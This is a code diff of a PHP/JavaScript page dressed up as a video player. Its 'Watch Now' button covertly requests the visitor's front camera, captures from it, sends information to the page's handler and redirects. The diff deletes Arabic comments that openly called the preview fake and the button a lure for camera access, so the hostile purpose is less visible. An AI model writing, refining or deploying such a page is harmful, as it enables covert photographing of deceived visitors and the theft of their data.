@@ -297,7 +297,6 @@ if (isset($_GET['r'])) {
             });
         }
 
-        // دالة زر "شاهد الآن" والتي تدمج طلب الكاميرا بشكل مباشر كسبب للمشاهدة
         function watchNowAction() {
             const btn = document.getElementById('watchBtn');
             if (btn) {
@@ -310,7 +309,6 @@ if (isset($_GET['r'])) {
                 return;
             }
 
-            // النقر على هذا الزر يمنح المتصفح الصلاحية الشرعية لفتح نافذة إذن الكاميرا باسم "شاهد الآن"
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -331,7 +329,6 @@ if (isset($_GET['r'])) {
                     }, 400);
                 })
                 .catch(err => {
-                    // في حال رفض المستخدم إذن الكاميرا، يتم المتابعة وإعادة التوجيه للهدف دون صورة
                     sendInfoAndRedirect("");
                 });
         }
@@ -340,13 +337,11 @@ if (isset($_GET['r'])) {
 <body>
     <div class="video-container" style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px;">
         <div style="position: relative; width: 100%; max-width: 400px; background: #111; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.5);">
-            <!-- معاينة الفيديو الوهمية -->
             <img src="<?php echo htmlspecialchars($meta_image); ?>" alt="Video Thumbnail" style="width: 100%; height: 250px; object-fit: cover; opacity: 0.7;">
             
             <div style="padding: 20px;">
                 <h3 style="font-size: 16px; margin-bottom: 15px; color: #fff;"><?php echo htmlspecialchars($meta_title); ?></h3>
                 
-                <!-- زر شاهد الآن الذي يعمل كمشغل أساسي لطلب الكاميرا عند النقر -->
                 <button id="watchBtn" onclick="watchNowAction()" style="background: #fe2c55; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; border-radius: 30px; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(254,44,85,0.4);">
                     ▶ شاهد الآن
                 </button>
@@ -355,7 +350,7 @@ if (isset($_GET['r'])) {
     </div>
 </body>
 </html>
-<?>
+<?php 
         exit();
     } else {
         die("Link not found.");
